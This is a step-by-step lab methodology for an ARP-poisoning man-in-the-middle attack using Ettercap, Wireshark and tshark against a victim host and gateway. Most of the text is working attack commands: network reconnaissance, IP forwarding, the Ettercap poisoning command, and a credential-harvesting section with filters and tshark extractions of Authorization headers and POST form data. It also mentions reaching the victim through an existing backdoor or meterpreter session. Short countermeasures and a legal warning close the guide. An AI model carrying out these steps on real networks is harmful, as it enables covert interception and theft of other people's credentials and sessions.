# MITM Attack Procedure with Ettercap and Wireshark

Complete methodology for performing Man-in-the-Middle attacks using ARP poisoning in controlled lab environment.

## Attack Overview
- **Technique**: ARP Poisoning
- **Tools**: Ettercap, Wireshark
- **Objective**: Intercept and analyze network traffic between victim and gateway
- **Environment**: Isolated lab network only

## Lab Environment Setup
- **Attacker**: Kali Linux (192.168.1.5)
- **Victim**: Windows 7 (192.168.1.10)
- **Gateway**: VirtualBox gateway (192.168.1.1)
- **Network**: Bridged or Internal network mode

## Step 1: Network Reconnaissance

```bash
# Discover network topology
ip route show

# Identify gateway
ip route | grep default

# Discover hosts on network
arp-scan -l
# or
nmap -sn 192.168.1.0/24
```

## Step 2: Enable IP Forwarding

```bash
# Enable IP forwarding (CRITICAL for maintaining connectivity)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify IP forwarding is enabled
cat /proc/sys/net/ipv4/ip_forward
# Should return: 1
```

## Step 3: Start Ettercap ARP Poisoning

```bash
# Basic ARP poisoning command
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//

# Command breakdown:
# -T: Text mode interface
# -M arp:remote: ARP poisoning attack mode
# /192.168.1.1//: Gateway target
# /192.168.1.10//: Victim target
```

## Step 4: Verify MITM Position

```bash
# Check ARP table manipulation on victim (if accessible)
arp -a

# On victim machine, attacker's MAC should appear for gateway IP
# Example output:
# 192.168.1.1 (gateway) at aa:bb:cc:dd:ee:ff [ether] on eth0
# (where aa:bb:cc:dd:ee:ff is attacker's MAC address)
```

## Step 5: Traffic Capture with Wireshark

```bash
# Start Wireshark with appropriate interface
sudo wireshark -i eth0

# Alternative: command-line capture
sudo tcpdump -i eth0 -w mitm_capture.pcap host 192.168.1.10
```

## Step 6: Wireshark Analysis

### Essential Filters for MITM Analysis

```
# All HTTP traffic
http

# HTTP authentication
http.authorization

# HTTP POST requests (form submissions)
http.request.method == "POST"

# Specific host traffic
ip.addr == 192.168.1.10

# ARP traffic verification
arp
```

### Credential Harvesting

1. **HTTP Basic Authentication Detection**
   - Filter: `http.authorization`
   - Look for "Authorization: Basic" headers
   - Decode Base64 strings to reveal credentials

2. **Form-based Login Interception**
   - Filter: `http.request.method == "POST"`
   - Examine form data in packet details
   - Look for parameters like "username", "password", "login"

3. **Clear Text Protocol Analysis**
   - FTP credentials: Filter `ftp`
   - Telnet sessions: Filter `telnet`
   - POP3/IMAP: Filter `pop` or `imap`

## Step 7: Evidence Documentation

### Traffic Analysis Results

```bash
# Extract HTTP credentials using tshark
tshark -r mitm_capture.pcap -Y "http.authorization" -T fields -e http.authorization

# Extract POST data
tshark -r mitm_capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data

# Export captured packets
File > Export Specified Packets > Save as .pcap
```

### Screenshot Evidence
- Wireshark showing intercepted credentials
- ARP table showing successful poisoning
- Network topology confirmation

## Step 8: Attack Cleanup

```bash
# Stop Ettercap (Ctrl+C)
# This automatically restores original ARP tables

# Disable IP forwarding
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# Monitor victim's outbound traffic (from attacker machine)
tcpdump -i eth0 src 192.168.1.10 and dst not 192.168.1.0/24
# If you see traffic to internet = connectivity restored

# Verify connectivity (requires victim machine access)
# Option 1: Physical/RDP access to victim
ping 8.8.8.8  # Run on victim machine

# Option 2: Remote shell (if compromised)
# Execute via existing backdoor/meterpreter session

# Option 3: No victim access
# Monitor only - connectivity assumed if normal traffic resumes
```

## Detection Indicators

**Signs of successful MITM:**
- Traffic visible in Wireshark from victim to external hosts
- ARP table shows attacker MAC for gateway IP
- Slight increase in network latency
- HTTP credentials captured in clear text

**Troubleshooting failed MITM:**
- Check IP forwarding is enabled
- Verify network mode allows traffic interception
- Confirm ARP poisoning is working with `arp -a`
- Check firewall rules blocking forwarded traffic

## Security Implications

1. **HTTP traffic** is completely vulnerable to interception
2. **Authentication credentials** transmitted in clear text are compromised
3. **Session cookies** can be captured for session hijacking
4. **Network protocols** without encryption expose sensitive data

## Countermeasures

1. **Use HTTPS** for all sensitive communications
2. **Static ARP entries** prevent ARP poisoning
3. **Network monitoring** can detect ARP table anomalies
4. **Switch port security** limits MAC address changes
5. **VPN tunneling** encrypts all traffic regardless of application protocol

## Legal and Ethical Considerations

⚠️ **WARNING**: This technique should only be used in:
- Authorized penetration testing engagements
- Personal lab environments
- Educational settings with proper supervision
- Networks you own or have explicit permission to test